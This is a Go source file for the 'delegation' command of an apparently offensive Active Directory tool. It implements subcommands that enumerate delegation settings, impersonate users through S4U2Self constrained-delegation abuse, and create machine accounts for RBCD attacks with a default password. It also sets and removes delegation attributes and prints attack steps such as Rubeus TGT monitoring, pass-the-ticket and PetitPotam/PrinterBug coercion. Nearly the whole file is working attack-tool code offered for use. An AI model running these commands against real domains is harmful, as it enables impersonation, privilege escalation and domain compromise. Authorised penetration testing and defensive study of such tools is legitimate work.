package main

import (
	"context"
	"encoding/json"
	"fmt"
	"strings"

	"github.com/loudmumble/trusted/pkg/delegation"
	"github.com/loudmumble/trusted/pkg/pki"
	"github.com/spf13/cobra"
)

var delegationCmd = &cobra.Command{
	Use:   "delegation",
	Short: "Delegation attacks — constrained, unconstrained, RBCD",
	Long: `Active Directory delegation attack framework.

Subcommands:
  enum         Enumerate all delegation configs
  constrained  Exploit constrained delegation (S4U2Self)
  rbcd         Exploit RBCD (Resource-Based Constrained Delegation)
  uncon        Detect unconstrained delegation
  create       Create machine account for RBCD
  delete       Delete machine account
  set          Set constrained delegation attribute
  remove       Remove constrained delegation attribute

Examples:
  trusted delegation enum --target-dc dc01 --domain corp.local -u user -p pass
  trusted delegation constrained --spn cifs/file01 --user admin
  trusted delegation rbcd --target COMPUTER$
  trusted delegation create --target EVIL$ --pass P@ssw0rd123!`,
}

var delegationEnumCmd = &cobra.Command{
	Use:   "enum",
	Short: "Enumerate delegation configs",
	RunE: func(cmd *cobra.Command, args []string) error {
		cfg := buildDelegationConfig(cmd)
		if err := pki.ValidateConnectionConfig(cfg); err != nil {
			return err
		}
		ctx := context.Background()

		conn, err := delegation.ConnectLDAP(ctx, cfg)
		if err != nil {
			return fmt.Errorf("LDAP connect: %w", err)
		}
		defer conn.Close()

		result, err := delegation.EnumerateDelegation(ctx, cfg, conn)
		if err != nil {
			return fmt.Errorf("enumerate delegation: %w", err)
		}

		outputJSON, _ := cmd.Flags().GetBool("json")
		if outputJSON {
			data, _ := json.MarshalIndent(result, "", "  ")
			fmt.Println(string(data))
			return nil
		}

		fmt.Printf("\n[+] Delegation Analysis\n")
		fmt.Printf("    Unconstrained: %d\n", result.UnconstrainedCount)
		fmt.Printf("    Constrained:   %d\n", result.ConstrainedCount)
		fmt.Printf("    RBCD:          %d\n", result.RBCDCount)

		if len(result.WritableForRBCD) > 0 {
			fmt.Printf("\n[!] Computers writable for RBCD:\n")
			for _, comp := range result.WritableForRBCD {
				fmt.Printf("    - %s\n", comp)
			}
		}

		if len(result.Targets) > 0 {
			fmt.Printf("\n[+] Detailed Delegation Targets:\n\n")
			for _, t := range result.Targets {
				fmt.Printf("  %s (%s)\n", t.Name, t.Type)
				fmt.Printf("    DN: %s\n", t.DN)
				if len(t.AllowedSPNs) > 0 {
					fmt.Printf("    SPNs: %s\n", strings.Join(t.AllowedSPNs, ", "))
				}
				if len(t.DelegatedTo) > 0 {
					fmt.Printf("    Delegated to: %s\n", strings.Join(t.DelegatedTo, ", "))
				}
				if len(t.RBCDSIDs) > 0 {
					fmt.Printf("    RBCD SIDs: %d\n", len(t.RBCDSIDs))
				}
				fmt.Println()
			}
		}

		return nil
	},
}

var delegationConstrainedCmd = &cobra.Command{
	Use:   "constrained",
	Short: "Exploit constrained delegation",
	RunE: func(cmd *cobra.Command, args []string) error {
		spn, _ := cmd.Flags().GetString("spn")
		user, _ := cmd.Flags().GetString("user")

		if spn == "" {
			return fmt.Errorf("--spn is required")
		}
		if user == "" {
			return fmt.Errorf("--user is required")
		}

		cfg := buildDelegationConfig(cmd)
		if err := pki.ValidateConnectionConfig(cfg); err != nil {
			return err
		}

		fmt.Printf("[*] Constrained Delegation\n")
		fmt.Printf("    SPN: %s\n", spn)
		fmt.Printf("    Impersonate: %s\n", user)
		fmt.Printf("    Using: %s\n", cfg.Username)

		s4uCfg := &delegation.S4UConfig{
			TargetSPN:        spn,
			Username:         cfg.Username,
			Domain:           cfg.Domain,
			Password:         cfg.Password,
			Hash:             cfg.Hash,
			TargetUser:       user,
			DomainController: cfg.TargetDC,
			Cache:            cfg.CCache,
			KeytabPath:       cfg.Keytab,
		}

		result, err := delegation.PerformS4U2Self(s4uCfg)
		if err != nil {
			return fmt.Errorf("S4U2Self failed: %w", err)
		}

		fmt.Printf("[+] S4U2Self successful\n")
		fmt.Printf("    Ticket obtained for: %s\n", result.Impersonate)
		return nil
	},
}

var delegationRBCDCmd = &cobra.Command{
	Use:   "rbcd",
	Short: "Exploit RBCD",
	RunE: func(cmd *cobra.Command, args []string) error {
		target, _ := cmd.Flags().GetString("target")
		pass, _ := cmd.Flags().GetString("pass")

		if target == "" {
			return fmt.Errorf("--target is required (e.g. COMPUTER$)")
		}

		cfg := buildDelegationConfig(cmd)
		if err := pki.ValidateConnectionConfig(cfg); err != nil {
			return err
		}
		ctx := context.Background()

		conn, err := delegation.ConnectLDAP(ctx, cfg)
		if err != nil {
			return fmt.Errorf("LDAP connect: %w", err)
		}
		defer conn.Close()

		machineName := strings.TrimSuffix(target, "$")
		if pass == "" {
			pass = "P@ssw0rd123!"
		}

		fmt.Printf("[*] RBCD Attack on %s\n", target)
		fmt.Printf("[*] Creating machine account: %s\n", machineName)
		machineDN, err := delegation.CreateMachineAccount(conn, cfg.Domain, machineName, pass)
		if err != nil {
			return fmt.Errorf("create machine account: %w", err)
		}
		fmt.Printf("[+] Machine account created: %s\n", machineDN)
		fmt.Printf("[+] Use S4U2Self/S4U2Proxy as %s$\n", machineName)

		return nil
	},
}

var delegationUnconCmd = &cobra.Command{
	Use:   "uncon",
	Short: "Detect unconstrained delegation",
	RunE: func(cmd *cobra.Command, args []string) error {
		target, _ := cmd.Flags().GetString("target")
		if target == "" {
			return fmt.Errorf("--target is required")
		}

		cfg := buildDelegationConfig(cmd)
		if err := pki.ValidateConnectionConfig(cfg); err != nil {
			return err
		}

		fmt.Printf("[*] Unconstrained Delegation on %s\n", target)
		fmt.Printf("    Domain: %s\n", cfg.Domain)
		fmt.Printf("    User: %s\n", cfg.Username)
		fmt.Println("\n[!] Unconstrained delegation allows any service to impersonate any user.")
		fmt.Println("[*] Attack vectors:")
		fmt.Println("    1. Monitor for TGTs: Rubeus.exe monitor /interval:5")
		fmt.Println("    2. Use TGTs for pass-the-ticket")
		fmt.Println("    3. Coerce auth via PetitPotam/PrinterBug")
		return nil
	},
}

var delegationCreateCmd = &cobra.Command{
	Use:   "create",
	Short: "Create machine account",
	RunE: func(cmd *cobra.Command, args []string) error {
		target, _ := cmd.Flags().GetString("target")
		pass, _ := cmd.Flags().GetString("pass")

		if target == "" {
			return fmt.Errorf("--target is required (e.g. EVIL$)")
		}

		cfg := buildDelegationConfig(cmd)
		if err := pki.ValidateConnectionConfig(cfg); err != nil {
			return err
		}
		ctx := context.Background()

		conn, err := delegation.ConnectLDAP(ctx, cfg)
		if err != nil {
			return fmt.Errorf("LDAP connect: %w", err)
		}
		defer conn.Close()

		machineName := strings.TrimSuffix(target, "$")
		if pass == "" {
			pass = "P@ssw0rd123!"
		}

		fmt.Printf("[*] Creating machine account: %s\n", machineName)
		dn, err := delegation.CreateMachineAccount(conn, cfg.Domain, machineName, pass)
		if err != nil {
			return fmt.Errorf("create machine account: %w", err)
		}

		fmt.Printf("[+] Machine account created: %s\n", dn)
		fmt.Printf("    Name: %s$\n", machineName)
		fmt.Printf("    Password: %s\n", pass)
		return nil
	},
}

var delegationDeleteCmd = &cobra.Command{
	Use:   "delete",
	Short: "Delete machine account",
	RunE: func(cmd *cobra.Command, args []string) error {
		target, _ := cmd.Flags().GetString("target")
		if target == "" {
			return fmt.Errorf("--target is required (e.g. EVIL$)")
		}

		cfg := buildDelegationConfig(cmd)
		if err := pki.ValidateConnectionConfig(cfg); err != nil {
			return err
		}
		ctx := context.Background()

		conn, err := delegation.ConnectLDAP(ctx, cfg)
		if err != nil {
			return fmt.Errorf("LDAP connect: %w", err)
		}
		defer conn.Close()

		machineName := strings.TrimSuffix(target, "$")
		dn := fmt.Sprintf("CN=%s,CN=Computers,%s", machineName, buildDomainDNFromDomain(cfg.Domain))
		fmt.Printf("[*] Deleting machine account: %s\n", dn)

		if err := delegation.DeleteMachineAccount(conn, dn); err != nil {
			return fmt.Errorf("delete machine account: %w", err)
		}

		fmt.Printf("[+] Machine account deleted\n")
		return nil
	},
}

var delegationSetCmd = &cobra.Command{
	Use:   "set",
	Short: "Set delegation attribute",
	RunE: func(cmd *cobra.Command, args []string) error {
		target, _ := cmd.Flags().GetString("target")
		spn, _ := cmd.Flags().GetString("spn")

		if target == "" || spn == "" {
			return fmt.Errorf("--target and --spn are required")
		}

		cfg := buildDelegationConfig(cmd)
		if err := pki.ValidateConnectionConfig(cfg); err != nil {
			return err
		}
		ctx := context.Background()

		conn, err := delegation.ConnectLDAP(ctx, cfg)
		if err != nil {
			return fmt.Errorf("LDAP connect: %w", err)
		}
		defer conn.Close()

		fmt.Printf("[*] Setting delegation on %s → %s\n", target, spn)
		if err := delegation.SetConstrainedDelegation(conn, target, spn); err != nil {
			return fmt.Errorf("set delegation: %w", err)
		}

		fmt.Printf("[+] Delegation configured\n")
		return nil
	},
}

var delegationRemoveCmd = &cobra.Command{
	Use:   "remove",
	Short: "Remove delegation attribute",
	RunE: func(cmd *cobra.Command, args []string) error {
		target, _ := cmd.Flags().GetString("target")
		spn, _ := cmd.Flags().GetString("spn")

		if target == "" || spn == "" {
			return fmt.Errorf("--target and --spn are required")
		}

		cfg := buildDelegationConfig(cmd)
		if err := pki.ValidateConnectionConfig(cfg); err != nil {
			return err
		}
		ctx := context.Background()

		conn, err := delegation.ConnectLDAP(ctx, cfg)
		if err != nil {
			return fmt.Errorf("LDAP connect: %w", err)
		}
		defer conn.Close()

		fmt.Printf("[*] Removing delegation from %s → %s\n", target, spn)
		if err := delegation.RemoveConstrainedDelegation(conn, target, spn); err != nil {
			return fmt.Errorf("remove delegation: %w", err)
		}

		fmt.Printf("[+] Delegation removed\n")
		return nil
	},
}

func buildDelegationConfig(cmd *cobra.Command) *pki.ADCSConfig {
	targetDC, _ := cmd.Flags().GetString("target-dc")
	domain, _ := cmd.Flags().GetString("domain")
	username, _ := cmd.Flags().GetString("username")
	password, _ := cmd.Flags().GetString("password")
	hash, _ := cmd.Flags().GetString("hash")
	kerberos, _ := cmd.Flags().GetBool("kerberos")
	ccache, _ := cmd.Flags().GetString("ccache")
	keytab, _ := cmd.Flags().GetString("keytab")
	dcIP, _ := cmd.Flags().GetString("dc-ip")
	useTLS, _ := cmd.Flags().GetBool("ldaps")
	useStartTLS, _ := cmd.Flags().GetBool("start-tls")
	stealth, _ := cmd.Flags().GetBool("stealth")
	timeout, _ := cmd.Flags().GetInt("timeout")

	return &pki.ADCSConfig{
		TargetDC:    targetDC,
		Domain:      domain,
		Username:    username,
		Password:    password,
		Hash:        hash,
		Kerberos:    kerberos,
		CCache:      ccache,
		Keytab:      keytab,
		KDCIP:       dcIP,
		UseTLS:      useTLS,
		UseStartTLS: useStartTLS,
		Stealth:     stealth,
		Timeout:     timeout,
	}
}

func buildDomainDNFromDomain(domain string) string {
	parts := strings.Split(domain, ".")
	var dcParts []string
	for _, p := range parts {
		dcParts = append(dcParts, "DC="+p)
	}
	return strings.Join(dcParts, ",")
}

func init() {
	rootCmd.AddCommand(delegationCmd)

	delegationCmd.AddCommand(delegationEnumCmd)
	delegationCmd.AddCommand(delegationConstrainedCmd)
	delegationCmd.AddCommand(delegationRBCDCmd)
	delegationCmd.AddCommand(delegationUnconCmd)
	delegationCmd.AddCommand(delegationCreateCmd)
	delegationCmd.AddCommand(delegationDeleteCmd)
	delegationCmd.AddCommand(delegationSetCmd)
	delegationCmd.AddCommand(delegationRemoveCmd)

	addConnectionFlags(delegationEnumCmd)
	addConnectionFlags(delegationConstrainedCmd)
	addConnectionFlags(delegationRBCDCmd)
	addConnectionFlags(delegationUnconCmd)
	addConnectionFlags(delegationCreateCmd)
	addConnectionFlags(delegationDeleteCmd)
	addConnectionFlags(delegationSetCmd)
	addConnectionFlags(delegationRemoveCmd)

	delegationConstrainedCmd.Flags().String("spn", "", "Target SPN")
	delegationConstrainedCmd.Flags().String("user", "", "Target user to impersonate")

	delegationRBCDCmd.Flags().String("target", "", "Target (e.g. COMPUTER$)")
	delegationRBCDCmd.Flags().String("pass", "P@ssw0rd123!", "Password for machine account")

	delegationUnconCmd.Flags().String("target", "", "Target (e.g. COMPUTER$)")

	delegationCreateCmd.Flags().String("target", "", "Target (e.g. EVIL$)")
	delegationCreateCmd.Flags().String("pass", "P@ssw0rd123!", "Password for machine account")

	delegationDeleteCmd.Flags().String("target", "", "Target (e.g. EVIL$)")

	delegationSetCmd.Flags().String("target", "", "Target")
	delegationSetCmd.Flags().String("spn", "", "Target SPN")

	delegationRemoveCmd.Flags().String("target", "", "Target")
	delegationRemoveCmd.Flags().String("spn", "", "Target SPN")
}

func addConnectionFlags(cmd *cobra.Command) {
	cmd.Flags().String("target-dc", "", "Target DC")
	cmd.Flags().StringP("domain", "d", "", "Domain")
	cmd.Flags().StringP("username", "u", "", "Username")
	cmd.Flags().StringP("password", "p", "", "Password")
	cmd.Flags().String("hash", "", "NTLM hash")
	cmd.Flags().BoolP("kerberos", "k", false, "Kerberos auth")
	cmd.Flags().String("ccache", "", "Ccache file")
	cmd.Flags().String("keytab", "", "Keytab file")
	cmd.Flags().String("dc-ip", "", "KDC IP")
	cmd.Flags().Bool("ldaps", false, "Use LDAPS")
	cmd.Flags().Bool("start-tls", false, "Use StartTLS")
	cmd.Flags().Bool("stealth", false, "Stealth mode")
	cmd.Flags().Int("timeout", 10, "Timeout (seconds)")
	cmd.Flags().Bool("json", false, "JSON output")
}
